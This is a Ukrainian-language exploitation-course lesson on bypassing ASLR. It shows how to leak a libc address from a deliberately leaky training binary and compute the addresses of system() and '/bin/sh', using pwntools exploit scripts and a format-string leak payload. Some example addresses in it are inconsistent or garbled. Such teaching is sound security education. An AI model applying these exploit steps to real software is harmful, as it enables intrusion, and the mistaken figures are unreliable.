# Stage 07: Leak Demo - Витік адрес для обходу ASLR

## 🎯 Мета завдання

Навчитися **витягувати адреси** з процесу для обходу ASLR (Address Space Layout Randomization). Це критичний навик для експлуатації сучасних програм де всі адреси рандомізовані.

## 📚 Що ви дізнаєтесь

- Що таке ASLR і чому він ускладнює експлуатацію
- Що таке витік адреси (address leak / information disclosure)
- Як розрахувати базову адресу libc з витоку
- Що таке офсети функцій в libc
- Різниця між адресами в бінарнику та в пам'яті
- Техніка "leak → calculate base → exploit"

## 🔧 Необхідні інструменти

```bash
# Python та pwntools
pip3 install pwntools

# ldd для перевірки libc
sudo apt install libc-bin

# readelf для аналізу ELF
sudo apt install binutils
```

## 📖 Теоретична основа

### Що таке ASLR?

**ASLR (Address Space Layout Randomization)** - механізм захисту ОС, який **рандомізує** адреси в пам'яті при кожному запуску програми.

**Без ASLR (старі системи):**
```
Запуск 1:
  libc base: 0x7ffff7a00000
  puts():    0x7ffff7a809c0

Запуск 2:
  libc base: 0x7ffff7a00000  ← ТА САМА!
  puts():    0x7ffff7a809c0  ← ТА САМА!
```

**З ASLR (сучасні системи):**
```
Запуск 1:
  libc base: 0x7ffff7a00000
  puts():    0x7ffff7a809c0

Запуск 2:
  libc base: 0x7f8f91200000  ← ІНША!
  puts():    0x7f8f912809c0  ← ІНША!

Запуск 3:
  libc base: 0x7f12e3400000  ← ЗНОВУ ІНША!
  puts():    0x7f12e34809c0  ← ЗНОВУ ІНША!
```

### Чому ASLR проблема?

У попередніх завданнях ми знали точні адреси:
```python
win_addr = 0x401136  # Завжди така сама адреса
```

З ASLR це не працює:
```python
system_addr = ???  # Кожен раз інша!
```

### Рішення: Витік адреси

Якщо програма **виводить** адресу функції з libc, ми можемо:

1. **Витягти** адресу (leak)
2. **Розрахувати** базову адресу libc
3. **Знайти** потрібні функції відносно бази

```
       LEAK                CALCULATE              EXPLOIT
┌──────────────┐      ┌─────────────────┐     ┌──────────────┐
│ Програма     │      │ leaked_puts     │     │ libc.base =  │
│ виводить:    │  →   │ = 0x7fff...9c0  │  →  │   leaked -   │
│ PUTS=0x...   │      │                 │     │   offset     │
└──────────────┘      │ offset_puts =   │     │              │
                      │ 0x809c0 (з файлу)│     │ system =     │
                      └─────────────────┘     │ base + 0x... │
                                              └──────────────┘
```

### Анатомія libc

**libc.so.6** - стандартна бібліотека C з функціями: `printf`, `puts`, `system`, etc.

## 🔬 Анатомія libc: файл vs пам'ять (ДЕТАЛЬНО!)

Це **НАЙВАЖЛИВІША концепція** для розуміння leak та обходу ASLR!

### Візуалізація повного процесу:

```
╔═══════════════════════════════════════════════════════════════╗
║ КРОК 1: ФАЙЛ libc.so.6 НА ДИСКУ                              ║
╠═══════════════════════════════════════════════════════════════╣
║ Розташування: /lib/x86_64-linux-gnu/libc.so.6                ║
║                                                               ║
║ ┌───────────────────────────────────────────────────┐         ║
║ │ Offset 0x00000000 - ELF header                    │         ║
║ │ Offset 0x00001000 - .text (код)                   │         ║
║ │   ...                                             │         ║
║ │ Offset 0x000809c0 - Функція puts()  ◄─────────┐   │         ║
║ │   48 83 ec 08    sub    $0x8,%rsp          │   │         ║
║ │   48 89 f8       mov    %rdi,%rax          │   │         ║
║ │   ...                                      │   │         ║
║ │   c3             ret                       │   │         ║
║ │ Offset 0x00050d70 - Функція system()       │   │         ║
║ │ Offset 0x00198e1a - Рядок "/bin/sh"        │   │         ║
║ │   ...                                      │   │         ║
║ └───────────────────────────────────────────┼───┘         ║
║                                              │             ║
║ ЦІ OFFSET'И ФІКСОВАНІ для даної версії libc! │             ║
╚══════════════════════════════════════════════╪═════════════╝
                                               │
         ASLR рандомізує БАЗову адресу        │
         при кожному запуску процесу!         │
                        ▼                      │
╔═══════════════════════════════════════════════════════════════╗
║ КРОК 2: libc.so.6 ЗАВАНТАЖЕНО В ПАМ'ЯТЬ (Запуск 1)          ║
╠═══════════════════════════════════════════════════════════════╣
║ ┌────────────────────────────────────────────────┐            ║
║ │ Базова адреса: 0x7ffff7a00000  ◄── РАНДОМ!    │            ║
║ │                ▲                               │            ║
║ │                │ ASLR вибрала ЦЮ адресу       │            ║
║ │                │                               │            ║
║ │ 0x7ffff7a00000 + 0x809c0 = 0x7ffff7a809c0 ◄─┐ │            ║
║ │   └─────┬──────   └───┬─────   └──────┬────┘ │ │            ║
║ │       база        offset       puts адреса   │ │            ║
║ │                                               │ │            ║
║ │ puts():    0x7ffff7a809c0  ◄──────────────────┼─┤ LEAKED!   ║
║ │ system():  0x7ffff7a50d70  (база + 0x50d70)   │ │            ║
║ │ "/bin/sh": 0x7ffff7b98e1a  (база + 0x198e1a)  │ │            ║
║ └────────────────────────────────────────────────┘ │            ║
╚════════════════════════════════════════════════════╪═══════════╝
                                                     │
              Програма перезапущена                 │
              ASLR вибирає ІНШУ базу!               │
                        ▼                           │
╔═══════════════════════════════════════════════════════════════╗
║ КРОК 3: libc.so.6 ЗАВАНТАЖЕНО В ПАМ'ЯТЬ (Запуск 2)          ║
╠═══════════════════════════════════════════════════════════════╣
║ ┌────────────────────────────────────────────────┐            ║
║ │ Базова адреса: 0x7f8f91200000  ◄── ІНША!      │            ║
║ │                                                │            ║
║ │ 0x7f8f91200000 + 0x809c0 = 0x7f8f912809c0     │            ║
║ │                                                │            ║
║ │ puts():    0x7f8f912809c0  ◄─ ІНША адреса!    │            ║
║ │ system():  0x7f8f91250d70                     │            ║
║ │ "/bin/sh": 0x7f8f913989e1a                    │            ║
║ │                                                │            ║
║ │ АЛЕ! Offset'и НЕЗМІННІ:                        │            ║
║ │   puts offset:    0x809c0  ◄── ТА САМА!       │            ║
║ │   system offset:  0x50d70  ◄── ТА САМА!       │            ║
║ │   "/bin/sh" offset: 0x198e1a  ◄── ТА САМА!    │            ║
║ └────────────────────────────────────────────────┘            ║
╚═══════════════════════════════════════════════════════════════╝
```

## 🧮 Математика leak (покроково)

### Дано:
1. **Leak від сервера:** `PUTS=0x7ffff7a809c0`
2. **Offset з файлу:** `0x809c0` (знайдено через readelf)

### Мета:
Знайти адресу `system()` та `"/bin/sh"`

### Розв'язок:

**Крок 1: Формула зв'язку**
```
leaked_puts = libc_base + offset_puts
```

**Чому ця формула правильна?**
- ASLR рандомізує ТІЛЬКИ базову адресу
- Offset ВСЕРЕДИНІ libc незмінні
- Тому: реальна_адреса = база + фіксований_offset

**Крок 2: Розв'язуємо для libc_base**
```python
libc_base = leaked_puts - offset_puts
libc_base = 0x7ffff7a809c0 - 0x809c0
libc_base = 0x7ffff7a00000  ✓
```

**Перевірка (завжди робіть!):**
```python
# Останні 3 hex цифри мають бути 000
hex(libc_base)  # 0x7ffff7a00000  ← Закінчується на 000 ✓

# libc завжди вирівняна на PAGE_SIZE (зазвичай 0x1000)
libc_base & 0xfff == 0  # True ✓
```

**Крок 3: Знаходимо інші функції**
```python
# Offset system (з readelf):
offset_system = 0x50d70

# Реальна адреса system:
system_addr = libc_base + offset_system
system_addr = 0x7ffff7a00000 + 0x50d70
system_addr = 0x7ffff7a50d70  ✓
```

**Крок 4: Знаходимо рядки**
```python
# Offset "/bin/sh" (з strings + grep):
offset_binsh = 0x198e1a

# Реальна адреса "/bin/sh":
binsh_addr = libc_base + offset_binsh
binsh_addr = 0x7ffff7a00000 + 0x198e1a
binsh_addr = 0x7ffff7b98e1a  ✓
```

### Повна послідовність в exploit:

```python
from pwn import *

# Завантажуємо libc файл
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Offset'и з файлу (автоматично):
offset_puts = libc.symbols['puts']      # 0x809c0
offset_system = libc.symbols['system']  # 0x50d70

# Leak від сервера
io.sendline(b'LEAK')
line = io.recvline()  # b'PUTS=0x7ffff7a809c0\n'
leaked_puts = int(line.split(b'=')[1], 16)

# Розрахунок бази
libc.address = leaked_puts - offset_puts
# libc.address тепер = 0x7ffff7a00000

# ВСІ адреси автоматично оновлюються!
system_addr = libc.symbols['system']    # 0x7ffff7a50d70
binsh_addr = next(libc.search(b'/bin/sh\x00'))  # 0x7ffff7b98e1a
```

## 🔍 Як знайти offset в libc? (ДЕТАЛЬНО)

### Метод 1: readelf (покрокова інструкція)

**Крок 1: Знайти який libc використовує програма**
```bash
ldd ../build/stage07_leak_demo
```

**Вивід:**
```
linux-vdso.so.1 (0x00007ffff7fc8000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a00000)
        └────────────────────┬─────────────────────┘
                     Ось цей файл!
```

**Крок 2: Витягти таблицю символів**
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@@"
```

**Повний вивід:**
```
  1317: 00000000000809c0   456 FUNC    GLOBAL DEFAULT   14 puts@@GLIBC_2.2.5
  │      │                  │   │       │       │        │  │
  │      │                  │   │       │       │        │  └─ Назва + версія
  │      │                  │   │       │       │        └─ Номер секції
  │      │                  │   │       │       └─ Видимість
  │      │                  │   │       └─ Binding (GLOBAL)
  │      │                  │   └─ Тип (FUNC = функція)
  │      │                  └─ Розмір (456 байт)
  │      └─ VALUE (OFFSET) = 0x809c0  ◄── ОСЬ!
  └─ Symbol table entry number
```

**У Python:**
```python
offset_puts = 0x809c0  # Hex число
```

**Крок 3: Знайти інші корисні функції**
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E " (puts|system|execve|open|read|write)@@"
```

### Метод 2: pwntools (НАЙПРОСТІШИЙ)

```python
from pwn import *

# Завантажити libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Автоматично отримати offset'и
print(f"puts:   {hex(libc.symbols['puts'])}")
print(f"system: {hex(libc.symbols['system'])}")
print(f"execve: {hex(libc.symbols['execve'])}")
print(f"open:   {hex(libc.symbols['open'])}")

# Шукати рядки
binsh = next(libc.search(b'/bin/sh\x00'))
print(f"/bin/sh: {hex(binsh)}")
```

**Вивід:**
```
puts:   0x809c0
system: 0x50d70
execve: 0xd5e50
open:   0x10dfc0
/bin/sh: 0x198e1a
```

### Метод 3: objdump (ручний спосіб)

```bash
objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep puts
```

**Вивід:**
```
00000000000809c0 g    DF .text  00000000000001c8  GLIBC_2.2.5 puts
                └─ Offset
```

**Формули:**
```
leaked_puts = libc_base + offset_puts
→ libc_base = leaked_puts - offset_puts

system_addr = libc_base + offset_system
```

## 💻 Аналіз коду сервера

```c
#define _GNU_SOURCE
#include <dlfcn.h>          // dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void){
    char cmd[64]={0};

    // Читаємо команду
    read(0, cmd, sizeof(cmd)-1);

    // Якщо команда "LEAK"
    if(strncmp(cmd, "LEAK", 4)==0){
        // Отримуємо РЕАЛЬНУ адресу puts() з libc
        void* p = dlsym(RTLD_NEXT, "puts");

        // Виводимо адресу
        dprintf(1, "PUTS=%p\n", p);
    }else{
        dprintf(1, "send LEAK\\n\n");
    }

    return 0;
}
```

### Що робить dlsym?

```c
void* p = dlsym(RTLD_NEXT, "puts");
```

- `dlsym` - динамічно знаходить символ (функцію) в завантажених бібліотеках
- `RTLD_NEXT` - шукати в наступній бібліотеці (libc)
- `"puts"` - ім'я функції
- Повертає **реальну адресу** `puts()` в пам'яті процесу

**Приклад виводу:**
```
PUTS=0x7ffff7a809c0
```

Ця адреса **рандомізована** ASLR при кожному запуску!

## 🚀 Покрокове рішення

### Крок 1: Збудуйте бінарник

```bash
cd stage07_leak_demo
./build.sh
```

### Крок 2: Експеримент з ASLR

Запустіть кілька разів і подивіться як змінюються адреси:

```bash
for i in {1..5}; do
    echo "LEAK" | ../build/stage07_leak_demo
done
```

Вивід:
```
PUTS=0x7ffff7a809c0
PUTS=0x7f8f912809c0
PUTS=0x7f12e34809c0
PUTS=0x7fa23bc809c0
PUTS=0x7f6789a809c0
```

Бачите? Кожен раз **різна адреса**!

### Крок 3: Знайдіть offset puts() в libc

**Спосіб 1: Через readelf**

Спочатку знайдіть яка libc використовується:
```bash
ldd ../build/stage07_leak_demo | grep libc
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

Знайдіть offset puts:
```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts@"
```

**Спосіб 2: Через pwntools (найкращий)**

```python
from pwn import *

# Завантажуємо ту саму libc що використовує програма
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Отримуємо offset
puts_offset = libc.symbols['puts']
print(f"puts offset: {hex(puts_offset)}")
```

### Крок 4: Створіть exploit

Файл `exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

# Налаштування
context.log_level = 'info'

# Завантажуємо бінарник
elf = ELF('../build/stage07_leak_demo', checksec=False)

# Завантажуємо libc (ТУ САМУ що використовує програма!)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

log.info(f"Offset puts() в libc: {hex(libc.symbols['puts'])}")
log.info(f"Offset system() в libc: {hex(libc.symbols['system'])}")

# Запускаємо процес
io = process('../build/stage07_leak_demo')

# Відправляємо команду LEAK
io.sendline(b'LEAK')

# Отримуємо витік
response = io.recvline().decode().strip()
log.info(f"Відповідь сервера: {response}")

# Парсимо адресу
leaked_puts = int(response.split('=')[1], 16)
log.success(f"Витік: puts() = {hex(leaked_puts)}")

# Розраховуємо базу libc
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Тепер ми знаємо де всі функції!
log.success(f"system() at: {hex(libc.symbols['system'])}")
log.success(f"'/bin/sh' at: {hex(next(libc.search(b'/bin/sh')))}")

io.close()
```

### Крок 5: Запустіть exploit

```bash
chmod +x exploit.py
python3 exploit.py
```

Очікуваний вивід:
```
[*] Offset puts() в libc: 0x809c0
[*] Offset system() в libc: 0x50d70
[+] Starting local process
[*] Відповідь сервера: PUTS=0x7ffff7a809c0
[+] Витік: puts() = 0x7ffff7a809c0
[+] Libc base: 0x7ffff7a00000
[+] system() at: 0x7ffff7a50d70
[+] '/bin/sh' at: 0x7ffff7b99e1a
```

## 🔍 Детальний розбір

### Візуалізація процесу

**1. Програма запускається:**
```
ASLR рандомізує адреси:
┌────────────────────────────┐
│ Програма:   0x400000       │  ← PIE OFF, фіксована
├────────────────────────────┤
│ Stack:      0x7fff...      │  ← Рандомізована
├────────────────────────────┤
│ libc base:  0x7ffff7a00000 │  ← РАНДОМІЗОВАНА!
│   puts:     base + 0x809c0 │
│   system:   base + 0x50d70 │
└────────────────────────────┘
```

**2. Відправляємо LEAK:**
```
Client → Server: "LEAK\n"
```

**3. dlsym знаходить puts:**
```c
void* p = dlsym(RTLD_NEXT, "puts");
// p = 0x7ffff7a809c0 (реальна адреса в пам'яті)
```

**4. Сервер виводить:**
```
Server → Client: "PUTS=0x7ffff7a809c0\n"
```

**5. Ми розраховуємо:**
```python
leaked_puts = 0x7ffff7a809c0
offset_puts = 0x809c0          # З файлу libc.so.6

libc_base = leaked_puts - offset_puts
          = 0x7ffff7a809c0 - 0x809c0
          = 0x7ffff7a00000

# Тепер знаємо де все:
system_addr = libc_base + 0x50d70
            = 0x7ffff7a00000 + 0x50d70
            = 0x7ffff7a50d70
```

### Чому offset'и фіксовані?

Offset - це **відстань** від початку файлу до функції. В одному файлі вона завжди однакова!

```bash
# Подивіться на offset в файлі
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts

# Результат:
# 1354: 00000000000809c0  456 FUNC GLOBAL DEFAULT 14 puts@@GLIBC_2.2.5
#                 ^^^^^^
#                 Offset (завжди однаковий для цього файлу)
```

**Важливо:** Різні версії libc мають **різні offset'и**!

```
Ubuntu 20.04 libc:  puts @ 0x809c0
Ubuntu 22.04 libc:  puts @ 0x80ed0  ← ІНШИЙ offset!
```

Тому **критично важливо** використовувати ту саму libc що й програма!

## 🎓 Практичні завдання

### Завдання 1: Перевірка різних функцій

```python
#!/usr/bin/env python3
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

# Витягуємо leak
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

# Розраховуємо базу
libc.address = leaked - libc.symbols['puts']

# Виводимо адреси корисних функцій
functions = ['system', 'execve', 'open', 'read', 'write', 'mprotect']
for func in functions:
    try:
        addr = libc.symbols[func]
        print(f"{func:12} = {hex(addr)}")
    except:
        print(f"{func:12} = NOT FOUND")

# Шукаємо рядки
strings = [b'/bin/sh', b'/bin/bash', b'sh']
for s in strings:
    try:
        addr = next(libc.search(s))
        print(f"{s.decode():12} = {hex(addr)}")
    except:
        print(f"{s.decode():12} = NOT FOUND")
```

### Завдання 2: Витяг libc версії

```python
#!/usr/bin/env python3
from pwn import *
import subprocess

# Leak адреси
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

print(f"[*] Leaked puts: {hex(leaked)}")

# Знайдемо яка libc
cmd = "ldd ../build/stage07_leak_demo | grep libc | awk '{print $3}'"
libc_path = subprocess.check_output(cmd, shell=True).decode().strip()
print(f"[*] Libc path: {libc_path}")

# Версія libc
cmd = f"strings {libc_path} | grep 'GNU C Library'"
version = subprocess.check_output(cmd, shell=True).decode().strip()
print(f"[*] Libc version: {version}")
```

### Завдання 3: Brute-force offset (якщо libc невідома)

Якщо ви не знаєте точної libc, але знаєте версію ОС:

```python
#!/usr/bin/env python3
from pwn import *

# Leak
io = process('../build/stage07_leak_demo')
io.sendline(b'LEAK')
leaked = int(io.recvline().split(b'=')[1], 16)
io.close()

# Останні 3 hex цифри завжди однакові (вирівнювання)
last_digits = leaked & 0xfff
print(f"[*] Leaked puts: {hex(leaked)}")
print(f"[*] Last 3 digits: {hex(last_digits)}")

# Можливі offset для різних libc (приклад)
known_offsets = {
    'Ubuntu 20.04': 0x809c0,
    'Ubuntu 22.04': 0x80ed0,
    'Ubuntu 18.04': 0x6f690,
}

for name, offset in known_offsets.items():
    if (offset & 0xfff) == last_digits:
        base = leaked - offset
        print(f"[+] Можливо {name}: base = {hex(base)}")
```

### Завдання 4: Leak через format string (бонус)

Якщо програма має вразливість format string, можна витягти адреси зі стеку:

```c
// Вразливий код
printf(user_input);  // ❌ Має бути: printf("%s", user_input);
```

```python
# Exploit
payload = b'%3$p'  # Виводить 3-й аргумент зі стеку як покажчик
# Можна витягти saved RIP, адреси libc, etc.
```

## 💡 Типи витоків

### 1. Прямий витік (наш випадок)

Програма **спеціально** виводить адресу:
```c
printf("Address: %p\n", some_function);
```

### 2. Format string leak

```c
printf(user_controlled);  // Вразливість
// Payload: %p %p %p ...
```

### 3. Buffer over-read

```c
write(1, buffer, 100);  // Але buffer тільки 50 байт
// Виведе 50 байт buffer + 50 байт за межами = leak
```

### 4. Use-after-free leak

```c
free(ptr);
printf("%p\n", ptr);  // ptr вказує на звільнену пам'ять з метаданими heap
```

### 5. GOT/PLT leak

```c
puts(puts);  // Виводить адресу самої puts() через PLT/GOT
```

## 🔐 Захист від витоків

### ASLR рівні

```bash
cat /proc/sys/kernel/randomize_va_space
```

- **0** = OFF (все фіксовано)
- **1** = Conservative (heap, stack, libraries)
- **2** = Full (все включно з PIE)

### Інші захисти

**PIE (Position Independent Executable):**
- Рандомізує **сам бінарник**
- Потрібен leak адреси з бінарника

**ASLR:**
- Рандомізує **бібліотеки, стек, heap**
- Потрібен leak адреси libc/stack

**Pointer encryption:**
- Деякі системи шифрують покажчики
- Ускладнює витік корисних адрес

## 📚 Важливі нюанси

### 1. Версія libc критична!

```python
# ❌ НЕПРАВИЛЬНО - використали іншу libc
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')  # Інша версія!
leaked = 0x7ffff7a809c0
base = leaked - libc.symbols['puts']  # Неправильна база!

# ✅ ПРАВИЛЬНО - використали ту саму libc
ldd_output = subprocess.check_output(['ldd', './binary'])
libc_path = parse_libc_path(ldd_output)
libc = ELF(libc_path)
```

### 2. Вирівнювання адрес

Адреси в libc завжди вирівняні:
```
0x7ffff7a809c0  ← Закінчується на 0 (вирівнювання 16 байт)
0x7ffff7a50d70  ← Теж
```

Останні 3 hex цифри **НЕ** змінюються ASLR!

### 3. Один leak = вся libc

З однієї адреси можна знайти **все**:
```python
leaked_any_function = ...
libc.address = leaked - libc.symbols['that_function']

# Тепер доступні всі функції:
system = libc.symbols['system']
execve = libc.symbols['execve']
binsh = next(libc.search(b'/bin/sh'))
```

## ✅ Чеклист виконання

- [ ] Зібрано бінарник через `build.sh`
- [ ] Розумію що таке ASLR і чому він проблема
- [ ] Експериментував з багатьма запусками (адреси різні)
- [ ] Знайшов offset puts() в libc
- [ ] Створив exploit що витягує leak
- [ ] Розрахував libc base з leak
- [ ] Знайшов адреси system() та "/bin/sh"
- [ ] Розумію чому offset'и фіксовані
- [ ] Знаю що libc версія критична
- [ ] Готовий до Stage 08 (ret2libc з ROP)!

---

**Час виконання:** 25-35 хвилин
**Складність:** ⭐⭐⭐☆☆ (Середня)
**Категорія:** PWN / Information Disclosure / ASLR Bypass
**Ключові поняття:** ASLR, leak, libc base calculation, dlsym

## 🎯 Наступний крок: Stage 08

Тепер ви вмієте:
1. ✅ BOF (Stage 06)
2. ✅ Leak адрес (Stage 07)

У **Stage 08** поєднаємо обидві техніки:
- Leak libc → Розрахувати базу → ROP chain → `system("/bin/sh")` або **ORW**!
